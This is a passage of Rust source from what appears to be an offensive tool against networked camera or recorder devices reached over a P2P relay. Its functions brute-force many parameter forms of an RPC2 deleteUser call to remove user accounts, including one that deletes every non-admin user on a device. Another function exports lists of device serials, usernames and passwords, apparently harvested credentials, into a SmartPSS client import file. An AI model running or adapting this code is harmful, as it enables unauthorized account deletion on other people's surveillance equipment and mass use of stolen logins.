                eprintln!("[debug] user Id={} not found in user list", user_id);
            }
        }
    }
    if listed && name.is_none() {
        return Err(format!(
            "user Id={} not found on device (user list queried ok) — aborting delete",
            user_id
        ));
    }

    // deleteUser param variants, most-specific first
    let mut variants: Vec<Value> = Vec::new();
    variants.extend([json!({"name": name}), json!({"name": name, "id": user_id})]);
    if let Some(u) = &user_obj {
        variants.push(json!({"user": u}));
    }
    variants.extend([
        json!({"user": {"Id": user_id, "Name": name}}),
        json!({"user": {"Name": name}}),
        json!({"user": {"Id": user_id}}),
        json!({"Id": user_id}),
        json!({"account": {"Id": user_id, "Name": name}}),
        json!({"account": {"Name": name}}),
        json!({"account": {"Id": user_id}}),
        json!({"user": {"Id": user_id, "Name": name}, "id": user_id}),
        json!({"users": [{"Id": user_id, "Name": name}]}),
        json!({"user": {"Id": user_id, "Name": name}, "session": session}),
        json!([{"Id": user_id, "Name": name}]),
        json!([{"user": {"Id": user_id, "Name": name}}]),
    ]);
    if user_obj.is_none() {
        variants.extend([
            json!({"users": [{"Id": user_id}]}),
            json!({"users": [{"Id": user_id, "Name": name}]}),
        ]);
    }

    for params in variants {
        let body = json!({
            "method": "userManager.deleteUser",
            "session": session,
            "params": params,
            "id": 101,
        });
        if args.verbose {
            eprintln!("[debug] deleteUser: {}", body);
        }
        if let Some(t) = http_call(
            sock,
            pcp_session,
            realm_id,
            host,
            "/RPC2",
            &body.to_string(),
            timeout,
            session,
        )
        .await
        {
            if let Some(b) = http_extract_body(&t) {
                if let Ok(v) = serde_json::from_str::<Value>(b) {
                    if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                        println!(
                            "  [+] user Id={} ({}) deleted via HTTP/RPC2",
                            user_id,
                            name.as_deref().unwrap_or("?")
                        );
                        return Ok(());
                    }
                    if args.verbose {
                        eprintln!("[debug] deleteUser variant failed: {}", b);
                    }
                }
            }
        } else if last_call_disc() {
            if args.verbose {
                eprintln!("[debug] deleteUser: device sent DISC — aborting");
            }
            return Err("device disconnected".into());
        }
    }

    // Fallback: alternate delete method names
    let alt_methods = ["accountManager.deleteAccount", "userManager.deleteUsers"];
    for method in alt_methods {
        for params in [
            json!({"name": name}),
            json!({"user": {"Id": user_id}}),
            json!({"account": {"Name": name}}),
        ] {
            let body = json!({"method": method, "session": session, "params": params, "id": 101});
            if args.verbose {
                eprintln!("[debug] {}: {}", method, body);
            }
            if let Some(t) = http_call(
                sock,
                pcp_session,
                realm_id,
                host,
                "/RPC2",
                &body.to_string(),
                timeout,
                session,
            )
            .await
            {
                if let Some(b) = http_extract_body(&t) {
                    if let Ok(v) = serde_json::from_str::<Value>(b) {
                        if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                            println!(
                                "  [+] user Id={} ({}) deleted via {}",
                                user_id,
                                name.as_deref().unwrap_or("?"),
                                method
                            );
                            return Ok(());
                        }
                        if args.verbose {
                            eprintln!("[debug] {} failed: {}", method, b);
                        }
                    }
                }
            } else if last_call_disc() {
                if args.verbose {
                    eprintln!("[debug] {}: device sent DISC — aborting", method);
                }
                return Err("device disconnected".into());
            }
        }
    }

    Err(format!("deleteUser failed for Id {}", user_id))
}

/// Delete ALL users except admin via HTTP/RPC2 on a specific port.
async fn http_try_delete_all(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    _dh_realm: &str,
    port: u16,
    args: &Args,
) -> Result<(), String> {
    if args.verbose {
        eprintln!("[debug] HTTP delete-all using port {}", port);
    }
    let (realm_id, session) = http_establish_session(sock, pcp_session, port, args).await?;
    let host = format!("127.0.0.1:{}", port);
    let timeout = Duration::from_secs(15);
    let result = http_delete_all_users(sock, pcp_session, realm_id, &host, &session, args).await;
    let _ = http_logout(sock, pcp_session, realm_id, &host, &session, timeout).await;
    ptcp_disconnect(sock, pcp_session, realm_id).await;
    result
}

/// Send userManager.deleteUser for every non-admin user (Id==2 or name "admin" skipped).
async fn http_delete_all_users(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    realm_id: u32,
    host: &str,
    session: &str,
    args: &Args,
) -> Result<(), String> {
    let timeout = Duration::from_secs(15);

    // List all users.
    let body = json!({
        "method": "userManager.getUserInfoAll",
        "session": session,
        "params": {},
        "id": 102,
    });
    let mut users: Vec<Value> = Vec::new();
    let mut listed = false;
    if let Some(t) = http_call(
        sock,
        pcp_session,
        realm_id,
        host,
        "/RPC2",
        &body.to_string(),
        timeout,
        session,
    )
    .await
    {
        if let Some(b) = http_extract_body(&t) {
            if let Ok(v) = serde_json::from_str::<Value>(b) {
                if let Some(arr) = v
                    .get("params")
                    .and_then(|p| p.get("users"))
                    .and_then(|u| u.as_array())
                {
                    users = arr.clone();
                    listed = true;
                }
            }
        }
    }
    if !listed {
        return Err("getUserInfoAll: no/invalid response — device never listed users".into());
    }

    // Collect targets except admin.
    let admin_id = 2u32;
    let targets: Vec<(u32, String)> = users
        .iter()
        .filter_map(|u| {
            let id = u
                .get("Id")
                .and_then(|x| x.as_u64())
                .map(|v| v as u32)
                .unwrap_or(0);
            let nm = u
                .get("Name")
                .and_then(|x| x.as_str())
                .unwrap_or("")
                .to_string();
            let is_admin = id == admin_id || nm.eq_ignore_ascii_case("admin");
            if is_admin {
                None
            } else {
                Some((id, nm))
            }
        })
        .collect();

    if targets.is_empty() {
        println!("  [!] no non-admin users found on device — nothing to delete");
        return Ok(());
    }
    println!("  [*] deleting {} user(s) (keeping admin)", targets.len());

    let mut deleted = 0usize;
    let mut failed = 0usize;
    for (id, nm) in &targets {
        let mut variants: Vec<Value> = vec![json!({"name": nm})];
        variants.extend([
            json!({"name": nm, "id": id}),
            json!({"user": {"Id": id, "Name": nm}}),
            json!({"user": {"Id": id}}),
            json!({"user": {"Name": nm}}),
            json!({"Id": id}),
            json!({"account": {"Id": id, "Name": nm}}),
            json!({"account": {"Name": nm}}),
            json!({"account": {"Id": id}}),
            json!({"users": [{"Id": id, "Name": nm}]}),
            json!([{"Id": id, "Name": nm}]),
        ]);
        let mut ok_this = false;
        for params in variants {
            let b2 = json!({
                "method": "userManager.deleteUser",
                "session": session,
                "params": params,
                "id": 101,
            });
            if args.verbose {
                eprintln!("[debug] deleteUser: {}", b2);
            }
            if let Some(t) = http_call(
                sock,
                pcp_session,
                realm_id,
                host,
                "/RPC2",
                &b2.to_string(),
                timeout,
                session,
            )
            .await
            {
                if let Some(b) = http_extract_body(&t) {
                    if let Ok(v) = serde_json::from_str::<Value>(b) {
                        if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                            ok_this = true;
                            break;
                        }
                    }
                }
            } else if last_call_disc() {
                break;
            }
        }
        if ok_this {
            println!("  [+] user Id={} ({}) deleted via HTTP/RPC2", id, nm);
            deleted += 1;
        } else {
            eprintln!("  [-] user Id={} ({}) delete failed", id, nm);
            failed += 1;
        }
        if last_call_disc() {
            eprintln!(
                "  [!] device sent DISC — stopping early ({} deleted, {} failed)",
                deleted, failed
            );
            break;
        }
    }

    if failed > 0 {
        Err(format!(
            "delete-all: {} deleted, {} failed",
            deleted, failed
        ))
    } else {
        println!("  [+] all {} non-admin user(s) deleted", deleted);
        Ok(())
    }
}

/// Fetch the user list and return the full user object whose "Id" matches, if any.
async fn http_find_user_object(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    realm_id: u32,
    host: &str,
    session: &str,
    user_id: u32,
    timeout: Duration,
    verbose: bool,
) -> (Option<Value>, bool) {
    let body = json!({
        "method": "userManager.getUserInfoAll",
        "session": session,
        "params": {},
        "id": 102,
    });
    if let Some(t) = http_call(
        sock,
        pcp_session,
        realm_id,
        host,
        "/RPC2",
        &body.to_string(),
        timeout,
        session,
    )
    .await
    {
        if let Some(b) = http_extract_body(&t) {
            if let Ok(v) = serde_json::from_str::<Value>(b) {
                if let Some(arr) = v
                    .get("params")
                    .and_then(|p| p.get("users"))
                    .and_then(|u| u.as_array())
                {
                    for user in arr {
                        let id = user.get("Id").and_then(|x| x.as_u64()).unwrap_or(0) as u32;
                        if id == user_id {
                            return (Some(user.clone()), true);
                        }
                    }
                    if verbose {
                        eprintln!("[debug] user Id={} not found in getUserInfoAll", user_id);
                    }
                    return (None, true);
                }
            } else if verbose {
                eprintln!("[debug] getUserInfoAll: bad JSON");
            }
        }
    } else if verbose {
        eprintln!("[debug] getUserInfoAll: http_call returned None (timeout)");
    }
    (None, false)
}

/// Fetch the user list and return the full user object whose "Name" matches, if any.
async fn http_find_user_object_by_name(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    realm_id: u32,
    host: &str,
    session: &str,
    user_name: &str,
    timeout: Duration,
    verbose: bool,
) -> (Option<Value>, bool) {
    let body = json!({
        "method": "userManager.getUserInfoAll",
        "session": session,
        "params": {},
        "id": 102,
    });
    if let Some(t) = http_call(
        sock,
        pcp_session,
        realm_id,
        host,
        "/RPC2",
        &body.to_string(),
        timeout,
        session,
    )
    .await
    {
        if let Some(b) = http_extract_body(&t) {
            if let Ok(v) = serde_json::from_str::<Value>(b) {
                if let Some(arr) = v
                    .get("params")
                    .and_then(|p| p.get("users"))
                    .and_then(|u| u.as_array())
                {
                    for user in arr {
                        let nm = user.get("Name").and_then(|x| x.as_str()).unwrap_or("");
                        if nm == user_name {
                            return (Some(user.clone()), true);
                        }
                    }
                    if verbose {
                        eprintln!("[debug] user '{}' not found in getUserInfoAll", user_name);
                    }
                    return (None, true);
                }
            } else if verbose {
                eprintln!("[debug] getUserInfoAll: bad JSON");
            }
        }
    } else if verbose {
        eprintln!("[debug] getUserInfoAll: http_call returned None (timeout)");
    }
    (None, false)
}

use chrono::Datelike;
use chrono::Timelike;

fn generate_smartpss_from_ok(
    ok_serials: &[String],
    path: &str,
    serial_names: &std::collections::HashMap<String, String>,
) -> Result<(), String> {
    use base64::Engine;
    let mut xml = String::from("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n");
    xml.push_str("<DeviceManager version=\"1.0\">\n");
    for (i, entry) in ok_serials.iter().enumerate() {
        let parts: Vec<&str> = entry.split('_').collect();
        if parts.len() < 4 {
            continue;
        }
        let country = parts[0];
        let serial = parts[1];
        let user = parts[2];
        let password = parts[3];
        let city = if parts.len() >= 5 { parts[4] } else { "" };
        let b64 = base64::engine::general_purpose::STANDARD.encode(password.as_bytes());
        // Se l'input era un XML SmartPSS, preserva il `name` dell'XML di origine;
        // altrimenti genera un name progressivo come prima.
        let name = match serial_names.get(serial) {
            Some(n) if !n.is_empty() => n.clone(),
            _ => {
                if city.is_empty() {
                    format!("{:02}_{}", i + 1, serial)
                } else {
                    format!("{:02}_{}_{}", i + 1, country, serial)
                }
            }
        };
        xml.push_str(&format!(
            "\n<Device connect=\"19\" domain=\"{}\" name=\"{}\" password=\"{}\" port=\"37777\" protocol=\"1\" username=\"{}\"/>",
            xml_escape_cli(serial),
            xml_escape_cli(&name),
            b64,
            xml_escape_cli(user)
        ));
    }
    xml.push_str("\n\n</DeviceManager>\n");
    std::fs::write(path, xml).map_err(|e| e.to_string())
}

fn xml_escape_cli(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
}
